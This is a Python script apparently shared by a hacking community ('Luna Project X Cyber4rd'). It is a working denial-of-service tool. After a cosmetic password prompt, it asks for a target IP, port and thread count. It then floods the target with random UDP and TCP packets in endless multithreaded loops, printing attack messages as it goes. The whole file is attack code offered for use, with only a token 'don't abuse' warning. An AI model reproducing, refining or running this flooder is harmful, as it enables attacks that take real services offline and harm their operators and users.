import random
import socket
import threading
import os
import sys
import time
from time import sleep

os.system("clear")
password ="LUNA"

for i in range(3):
        pwd = input("𝕻𝖆𝖘𝖘𝖜𝖔𝖗𝖉: ")
        j=1
        if(pwd==password):
                time.sleep(1)
                print("𝖂𝖆𝖎𝖙 5 𝖘𝖊𝖈𝖔𝖓𝖉𝖘\n")
                break
        else:
                time.sleep(1)
                print("𝖂𝖗𝖔𝖓𝖌 𝖕𝖆𝖘𝖘𝖜𝖔𝖗𝖉! \n")
                continue
time.sleep(5)
print("𝕻𝖆𝖘𝖘𝖜𝖔𝖗𝖉 𝖎𝖘 𝖈𝖔𝖗𝖗𝖊𝖈𝖙 \033[92m𝕷𝖚𝖓𝖆 𝕻𝖗𝖔𝖏𝖊𝖈𝖙\033[0m\n")
time.sleep(5)
os.system("clear")
print("\u001b[31m𝕽𝖊𝖆𝖉 𝖋𝖎𝖗𝖘𝖙!")
print("""\u001b[31m
|              WARNING DONT ABUSE!!              |



        𝕿𝖔𝖔𝖑𝖘 𝕭𝖞 𝕷𝖚𝖓𝖆 𝕻𝖗𝖔𝖏𝖊𝖈𝖙 || 𝕯𝖔𝖓𝖙 𝕬𝖇𝖚𝖘𝖊!!

\033[92m / [ 𝕷𝖚𝖓𝖆 𝕻𝖗𝖔𝖏𝖊𝖈𝖙 𝖃 𝕮𝖞𝖇𝖊𝖗4𝖗𝖉 ] \n
/ Make and coded by: 𝕷𝖚𝖓𝖆
/ Cyber4rd Comunity : https://discord.gg/xwekEUDF8H""")
ip = str(input("𝕴𝖕 𝕿𝖆𝖗𝖌𝖊𝖙: "))
port = int(input("𝕻𝖔𝖗𝖙: "))
choice = str(input("𝕷𝖊𝖘𝖙𝖌𝖔?: "))
times = int(input("𝕻𝖆𝖈𝖐𝖆𝖌𝖊: "))
threads = int(input("𝕿𝖍𝖗𝖊𝖆𝖉𝖘: "))
os.system("clear")
def ddos():
        data = random._urandom(1024)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(i +"\u001b[31m LUNA ATTACKING TO\033[92m ➤ {}:{} \u001b[31m".format(ip, port))
                except:
                        print("\033[92m DOWN DEK DEK")

def ddos2():
        data = random._urandom(1025)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\u001b[31m LUNA ATTACKING TO\033[92m ➤ {}:{} \u001b[31m".format(ip, port))
                except:
                        s.close()
                        print("\033[92m DOWN DEK DEK")

def ddos3():
        data = random._urandom(1025)
        i = random.choice(("[•]","[•]","[•]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\u001b[31m LUNA ATTACKING TO\033[92m ➤ {}:{} \u001b[31m".format(ip, port))
                except:
                        s.close()
                        print("\033[92m DOWN DEK DEK")

for y in range(threads):
        if choice == 'ddos':
                th = threading.Thread(target = ddos)
                th.start()
                th = threading.Thread(target = ddos2)
                th.start()
        else:
            th = threading.Thread(target = ddos3)
            th.start()